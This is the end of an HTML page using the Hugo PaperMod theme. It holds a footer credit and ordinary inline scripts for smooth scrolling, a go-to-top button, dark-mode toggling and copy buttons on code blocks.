        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>